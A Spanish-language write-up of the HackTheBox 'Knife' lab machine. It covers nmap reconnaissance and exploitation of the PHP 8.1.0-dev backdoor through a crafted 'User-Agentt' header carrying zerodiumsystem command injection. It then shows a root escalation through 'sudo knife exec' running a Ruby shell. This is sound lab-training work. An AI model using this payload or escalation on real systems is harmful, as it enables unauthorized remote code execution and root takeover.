---
published: true
title: HackTheBox - Knife [WriteUp]
date: '2021-07-08'
category: HackTheBox
description: WriteUp de la Máquina Knife de HackTheBox
---
![image-center](/assets/images/Knife_HTB/Knife_Infocard.png)

## Reconocimiento Inicial 
Comenzaremos realizando un escaneo con ```nmap``` mediante el siguiente comando para la enumeración de puertos de la máquina

```bash
nmap -p- -sS --min-rate 5000 --open -n -Pn -vvv 10.10.10.242 -oG allports
```
Del cual obtenemos los siguientes resultados

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 17:59 -04
Initiating SYN Stealth Scan at 17:59
Scanning 10.10.10.242 [65535 ports]
Discovered open port 22/tcp on 10.10.10.242
Discovered open port 80/tcp on 10.10.10.242
Completed SYN Stealth Scan at 18:00, 34.31s elapsed (65535 total ports)
Nmap scan report for 10.10.10.242
Host is up, received user-set (4.4s latency).
Scanned at 2021-07-07 17:59:47 -04 for 34s
Not shown: 65249 filtered ports, 284 closed ports
Reason: 65249 no-responses and 284 resets
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 34.46 seconds
           Raw packets sent: 131046 (5.766MB) | Rcvd: 296 (11.888KB)
```
Ya sabemos que nuestra máquina posee dos puertos abiertos, el 22 y el 80, por lo que ahora toca realizar un escaneo de las versiones de estos puertos para ver que información nos entrega

```bash
nmap -sC -sV -p22,80 10.10.10.242 -oN targeted
```
Obteniendo lo siguiente
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 18:20 -04
Nmap scan report for 10.10.10.242
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.91 seconds
```

Si accedemos a la página que nos indica el puerto 80, nos encontramos con lo siguiente
![image](/assets/images/Knife_HTB/Knife-pagina.png)

Mediante el uso de ```Wappalyzer``` podemos ver que la página tiene como servidor web un Apache 2.4.41 y como lenguaje de programación un PHP 8.1-dev.
Buscando en internet por alguna vulnerabilidad posible, me encuentro que existe una vulnerabilidad que permite un Backdoor Remote Command Injection 
[https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html](https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html)

Si analizamos el código que se menciona en el artículo podemos ver que en la función ```execCmd``` la linea ```r = s.get(args.url, headers={"User-Agentt":"zerodiumsystem(\""+args.cmd+"\");"})``` es la que ejecuta el comando en el servidor y nos devuelve la respuesta del comando que indicamos ejecutar, un ejemplo de uso se muestra a continuación

![image](/assets/images/Knife_HTB/resutlados_script.png)

Con esto claro podemos utilizar el código tal cual está o retocarlo un poco para hacer que solamente nos realice una Reverse Shell a nuestro equipo de atacante. En mi caso lo retoque un poco tal que solamente ejecute la reverse shell para obtener acceso quedando de la siguiente forma
![image](/assets/images/Knife_HTB/script-knife.png)

De este modo ya tenemos acceso al sistema, ahora toca realizar un tratamiento de la tty.

## User Flag

Una vez realizado el tratamiento, ejecute los comandos ```whoami``` y ```id``` obteniendo lo siguiente
```bash
james@knife:~$ whoami
james
james@knife:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@knife:~$
```
con esto ya sabemos que tenemos el usuario james y podemos ir a buscar la bandera como se muestra en la imagen
![imagen](/assets/images/Knife_HTB/userflag.png)

## PrivEsc y Root Flag

Realizando una enumeración básica de privilegios ```sudo -l``` encontramos la siguiente respuesta
```bash
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
james@knife:~$ 

```
[Knife](https://docs.chef.io/workstation/knife/) es una herramienta de línea de comandos que proporciona una interfaz entre un repositorio de Chef local y el Chef Infra Server la cual esta contruida en Ruby. Esta posee distintas funciones y herramientas pero nos enfocaremos en una llamada ```exec```. La cual nos permite ejecutar codigos o scripts hechos en Ruby. Indagando un poco en internet encontre esta [página](https://www.hacknos.com/perl-python-ruby-privilege-escalation-linux/) la cual indica como se puede realizar una elevación de privilegios con Ruby.

Por lo tanto y con esta información en nuestra mente ejecutamos esta linea de comandos
```bash
james@knife:~$ sudo knife exec
```
la cual nos abrira un editor donde podemos escribir el comando de ruby y ejecutarlo mediante ```ctrl+D```.
```bash
james@knife:~$ sudo knife exec
An interactive shell is opened

Type your script and do:

1. To run the script, use 'Ctrl D'
2. To exit, use 'Ctrl/Shift C'

Type here a script...
exec "/bin/bash";
root@knife:/home/james# 
```
Y con esto ya somos root y podemos ir por la flag
```bash
root@knife:/home/james# id
uid=0(root) gid=0(root) groups=0(root)
root@knife:/home/james# 
```
